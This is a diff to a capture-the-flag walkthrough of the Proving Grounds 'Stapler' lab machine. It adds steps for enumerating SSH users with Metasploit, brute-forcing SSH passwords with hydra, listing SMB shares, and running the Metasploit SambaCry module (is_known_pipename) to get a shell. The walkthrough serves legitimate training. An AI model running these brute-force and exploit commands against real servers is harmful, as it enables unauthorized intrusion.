@@ -1,7 +1,7 @@
 ---
 title: PG Stapler Walkthrough
 date: 2026-03-24
-categories: Offsec Proving-Grounds
+categories: Offsec | Proving-Grounds
 tags: exploitation,metasploit,web,smb
 toc: True
 ---
@@ -16,7 +16,7 @@ The machine is known for having multiple attack vectors—including FTP, SMB, an
 
 These Machines run on vulnerable systems.It allows us to find the structure of a machine like what type of technology it is using and how can we exploit it.
 
---
+---
 
 ## How to deploy machine
 
@@ -46,7 +46,13 @@ sudo openvpn example.ovpn
 
 Now we can work on it
 
---
+---
+
+## Important
+
+If I want so I can just show you how to get flag in a few steps but I want you to teach enumeration on all ports and services
+
+---
 
 ## Enumeration
 
@@ -68,7 +74,7 @@ We got some ports open
 
 **Lets Enumerate FTP Server**
 
---
+---
 
 ## FTP Enumeration
 
@@ -132,11 +138,139 @@ Just like FTP. We can also login to the SSH server with the credentials → `Use
 
 But we don't know the exact username and password so we will enumerate the usernames with metasploit-framework
 
+### Bruteforcing SSH Usernames
+
+We are going to bruteforce the usernames for SSH so we could login through them
+
 Launch Metasploit → `msfconsole`
 
 Search → `ssh_enumusers`
 
+![ssh_enumusers](/assets/img/pg-stapler/msf6.png)
+
+```bash
+use scanner/ssh/ssh_enumusers
+```
+
+Now we have to set `RHOST` and `USER_FILE`
+
+`RHOSTS` → Victums IP Address
+
+`USER_FILE` → File contains usernames to bruteforce
+
+```bash
+set RHOSTS IP
+set USER_FILE /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
+run
+```
+
+We got the user `mysql`
 
 
+![got ssh user](/assets/img/pg-stapler/msf8.png)
+
+We will try to bruteforce for its password
+
+### Bruteforcing SSH password
+
+We will `hydra` a Powerful tool for bruteforcing passwords
+
+```bash
+hydra -l mysql -P /usr/share/wordlists/rockyou.txt ssh://IP
+```
 
 
+![hydra ssh](/assets/img/pg-stapler/hydrassh.png)
+
+I did but didn't get any successful result
+
+# Lets check port 80
+
+I opened the browser but didn't get anything that means there is no technology running on `port 80`
+
+---
+
+## Enumerating SMB
+
+Server Message Block (SMB) is a network protocol used for sharing files, printers, and other
+resources between computers on a local network. While SMB provides convenient file
+sharing capabilities, improper configuration or the use of older, insecure versions can leave
+systems vulnerable to enumeration and exploitation
+
+We will use smbclient 
+
+```bash
+smbclient -L IP
+```
+
+![got smb sharename](/assets/img/pg-stapler/smb.png)
+
+Now lets use this sharename to login
+
+```bash
+smbclient //IP/Sharename
+```
+
+I used the Sharename `kathy`
+
+and got a file which contain a message but didn't any secret information
+
+### Exploiting SMB
+
+We saw in our nmap scan that the SMB is running on samba smbd 4.3.9
+
+Lets search for a online exploit related to this
+
+
+![smb exploit search](/assets/img/pg-stapler/smbsearch.png)
+
+I got some information on `Rapid 7` website
+
+As we can see in the description
+
+![rapid 7 description](/assets/img/pg-stapler/smbsearch2.png)
+
+In the description they are saying that this module can exploit Samba versions 3.5.0 to 4.4.14 
+
+And our Samba version is 4.3.9 so it means this exploit will work.
+
+**Sometimes exploits doesn't work so don't frustrate try again**
+
+![got exploit](/assets/img/pg-stapler/smbsearch3.png)
+
+Now we have the exploit `exploit/linux/samba/is_known_pipename`
+
+Start Metasploit-Framework
+
+`msfconsole` → Starts the Metasploit-Framework
+
+```bash
+use exploit/linux/samba/is_known_pipename
+options
+set RHOSTS IP
+set RPORT 139
+set SMB_SHARE_NAME kathy
+exploit
+```
+
+**Now you got the shell**
+
+Its your duty to find the flags in machine
+
+---
+
+## Flag tip
+
+You will be in a default folder when you will land on the target machine so use this command
+
+```bash
+cd ../../../../../../../../../
+```
+
+```bash
+cd /
+```
+
+Now you go in any folder
+
+# Congrats to completing you stapler room
